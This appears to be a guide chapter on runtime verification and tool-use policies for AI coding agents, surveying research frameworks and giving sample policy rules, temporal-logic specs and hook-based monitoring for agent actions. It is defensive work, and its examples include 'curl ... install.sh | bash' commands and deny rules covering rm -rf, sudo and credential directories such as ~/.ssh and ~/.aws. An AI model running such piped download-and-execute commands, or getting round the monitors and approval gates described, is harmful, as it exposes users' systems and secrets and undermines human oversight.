# 08 — Runtime Verification and Tool-Use Policies

For coding agents, the riskiest moment is often not when the model writes text. It is when the agent acts.

A coding agent can:

- run shell commands,
- edit files,
- read secrets,
- call browsers,
- query databases,
- send emails,
- create pull requests,
- deploy services,
- install packages,
- invoke other agents or skills.

That means formal methods do not need to begin inside the neural model. They can begin at the door to each action.

Runtime verification is the door guard.

## The ELI5 version

Imagine a child with a toolbox.

The child says:

```text
I want to use the saw.
```

The adult does not need to read the child’s mind. The adult checks the rule:

```text
Saws require supervision.
```

If supervision is missing, the saw stays locked.

For an agent:

```text
I want to run: curl http://random-site/install.sh | bash
```

The monitor checks:

```text
Downloading and piping to shell is high risk.
Require approval or block.
```

The monitor does not prove the LLM is safe. It enforces a policy over observable actions.

## Why runtime verification is practical for agents

The internal reasoning of an LLM is hard to verify. But tool calls are structured:

```json
{
  "tool_name": "Bash",
  "tool_input": {"command": "git push origin main"}
}
```

Structured events are checkable. You can write rules over them.

Examples:

```text
Never call deploy unless tests_passed=true.
Never send email unless human_approved=true.
Never pass strings matching secret patterns to browser.search.
Never write outside the repo root.
Never install a dependency without lockfile update and security scan.
Only call database.write after user confirmation.
```

These rules can be expressed as code, policy DSLs, temporal logic, or model-checker properties. They are formal-ish even when not written in Lean.

## AgentGuard: runtime assurance as a formal-methods layer

[AgentGuard: Runtime Verification of AI Agents](https://arxiv.org/html/2509.23864v1) is a research framing for runtime verification of agentic AI. It argues that autonomous agents are stochastic, tool-using, memory-using, and unpredictable, so traditional deterministic verification is not enough. Instead, it proposes Dynamic Probabilistic Assurance.

The paper’s architecture:

1. Observe raw agent input/output.
2. Abstract observations into formal events.
3. Build/update a Markov Decision Process through online learning.
4. Use probabilistic model checking to verify quantitative properties in real time.

The key idea is not that AgentGuard magically proves the whole agent safe. The key idea is that the agent’s behavior can be monitored as a trace of events. Runtime verification can then ask questions like:

```text
What is the probability that this agent reaches a failure state within budget?
Is this behavior moving toward a risky state?
Did the execution violate an observed safety property?
```

This is especially relevant for long-running coding agents. A one-shot code completion is a text artifact. A long-running agent is an evolving process.

## GoPlus AgentGuard: a concrete coding-agent guard

The [GoPlusSecurity/agentguard](https://github.com/GoPlusSecurity/agentguard) repository shows what this looks like in open-source tooling. Its README describes AgentGuard as a real-time security layer for AI agents that scans skills, blocks dangerous actions before execution, runs security patrols, and tracks which skill initiated each action.

The captured README includes integrations and commands such as:

```bash
agentguard init --agent claude-code
agentguard init --agent codex
agentguard init --agent openclaw
printf '{"tool_name":"Bash","tool_input":{"command":"curl https://example.com/install.sh | bash"}}' | agentguard protect
```

It also describes hook integrations such as Claude Code `PreToolUse`/`PostToolUse`, OpenClaw `before_tool_call`/`after_tool_call`, and Hermes shell hooks. This is exactly the runtime-enforcement pattern for coding agents:

```text
agent proposes tool call
hook intercepts
policy engine evaluates
allow / block / ask approval
log event
```

The repository should not be treated as proof that the category is solved. It is evidence that practitioners are building concrete guard layers for coding-agent runtimes.

## AgentRaft: data-flow analysis for tool chains

Agents do not only call dangerous tools. They move data between tools.

A user might ask:

```text
Read my spreadsheet and email the summary to my manager.
```

The agent might read too much data, include hidden sensitive columns, or pass private data through a summarizer or browser tool. This is a data-flow problem.

[AgentRaft](https://arxiv.org/html/2603.07557v1) defines Data Over-Exposure (DOE) in LLM agents: an agent transmits sensitive data beyond user intent and functional necessity. It argues that DOE comes from broad tool data and coarse-grained LLM processing.

AgentRaft combines:

1. Cross-tool function call graph generation.
2. User prompt synthesis to trigger deep tool paths.
3. Runtime taint tracking.
4. Multi-LLM voting grounded in privacy regulations.

The paper evaluates on 6,675 real-world agent tools and reports DOE as a systemic risk across potential tool interaction paths.

For coding agents, translate that into everyday terms:

```text
The agent reads .env.
The agent includes a secret in an error summary.
The browser/search tool receives that summary.
The secret left the safe boundary.
```

A formal or program-analysis-style data-flow guard can track labels:

```text
secret -> internal-only -> external-forbidden
```

Then block illegal flows.

## AgentVerify: temporal logic over agent operations

[AgentVerify](https://preprints.org/manuscript/202604.1029) is a non-peer-reviewed 2026 preprint, so treat it cautiously. It is still useful as a design vocabulary. It proposes compositional formal verification of AI agent safety properties via LTL model checking.

Its central move is practical: treat the LLM as a nondeterministic oracle inside a larger finite-state machine defined by the orchestration layer. Then write temporal-logic specifications over observable domains:

- memory integrity,
- tool call safety,
- MCP/skill invocation protocols,
- human interaction boundaries.

Examples of temporal properties:

```text
A high-risk tool call must be preceded by human confirmation.
Every skill request must eventually receive a response.
PII must not be written to public memory.
A deceptive response must not be returned to the user.
```

The paper reports a hybrid architecture: lightweight runtime monitor for immediate intervention and deeper post-hoc analysis over complete traces. That split is valuable:

```text
runtime monitor = stop the bleeding now
post-hoc verifier = audit what happened and improve the system
```

Even if this particular preprint changes, the architecture is likely to persist.

## SEVerA: hard constraints plus learning

[SEVerA: Verified Self-Evolving Agents](https://arxiv.org/html/2603.25111v2) addresses a different but related problem. Self-evolving agents generate programs that call models and tools, then tune those components for better task performance. That is powerful but risky: optimization can break safety constraints.

SEVerA introduces Formally Guarded Generative Models (FGGMs). The planner LLM can specify a formal output contract for each generative-model call using first-order logic. Each call is wrapped in a rejection sampler with a verified fallback, so every returned output satisfies the specified contract.

The framework has three stages:

1. Search — planner samples candidate programs.
2. Verification — prove hard constraints for all parameter values.
3. Learning — optimize soft objectives while preserving correctness.

The paper reports zero constraint violations across tasks including Dafny invariant generation and policy-compliant agentic tool use.

For coding-agent users, the key idea is:

```text
Let learning improve performance only inside a formally guarded box.
```

Do not fine-tune or self-improve an agent and hope it keeps policies. Put hard constraints around the parts that must never break.

## Tool-use policies as formal specs

A tool policy can be simple:

```yaml
rules:
  - name: deploy_requires_tests_and_approval
    when: tool == "deploy"
    require:
      tests_passed: true
      human_approved: true
  - name: no_secrets_to_browser
    when: tool == "browser.search"
    forbid_input_labels: [secret, credential, pii]
```

Or temporal:

```text
G(deploy -> previously(tests_passed) and previously(human_approved))
G(secret_read -> !future(external_send(secret)))
G(retry_count >= 3 -> F(ask_human or stop))
```

You do not need to love the notation. You need the thought:

```text
The agent may choose actions, but the action stream must satisfy rules.
```

## Runtime policies for a coding-agent harness

Here are practical policies worth considering:

### File-system boundaries

```text
Agent may edit files under repo root.
Agent may not edit ~/.ssh, ~/.aws, ~/.config, or parent directories.
Agent may not delete source files without explicit approval.
```

### Shell boundaries

```text
Safe commands allowed: ls, pwd, grep, rg, git status.
Risky commands require approval: rm, mv outside repo, curl | bash, sudo, chmod recursive, package publish.
```

### Git boundaries

```text
No push without explicit human approval.
No force push.
No commit if validation command fails.
```

### Network boundaries

```text
No external upload of repository contents.
No secrets to browser or web search.
No package install from untrusted source without approval.
```

### Human approval boundaries

```text
Irreversible actions require approval.
Money movement requires approval.
Production deployment requires approval.
Credential access requires approval.
```

### Memory boundaries

```text
Untrusted web content must be labeled untrusted.
Untrusted content may not become instructions.
Secrets may not be written to long-term memory.
```

Each policy is a small formal-methods seed. You can start with code checks and evolve toward temporal logic or model checking as risk grows.

## The runtime verification loop

```text
agent proposes action
  -> event is labeled
  -> policy checks current event + history
  -> allowed? execute and log
  -> forbidden? block and explain
  -> ambiguous? ask human
  -> repeated failure? update harness or skill
```

The explanation matters. A good block reason helps the agent repair:

```text
blocked: deploy requires tests_passed=true; current tests_passed=false
```

That is better than:

```text
permission denied
```

The first message teaches the agent the invariant.

## Why this is formal methods, not just security middleware

Runtime guards can be ad hoc. Formal methods enter when you state properties precisely, reason over histories, and maintain auditability.

A plain allowlist says:

```text
allow git status
block rm -rf
```

A formal-ish policy says:

```text
For every execution trace, a deploy event is legal only if a successful test event and human approval event occur earlier in the same task session.
```

That is a temporal property over an event trace. It is exactly the kind of thing model checking and runtime verification were built to express.

## Summary

For coding agents, runtime verification may be the most immediately practical formal-methods entry point.

You may not verify the LLM. You can verify or enforce the action stream around it:

```text
tool calls
file writes
network requests
memory events
approval gates
data flows
subagent handoffs
```

The best current pattern is simple: treat the model as an untrusted generator and wrap it in checkable policy. Let the agent be creative inside the sandbox. Be mathematically boring at the boundary.
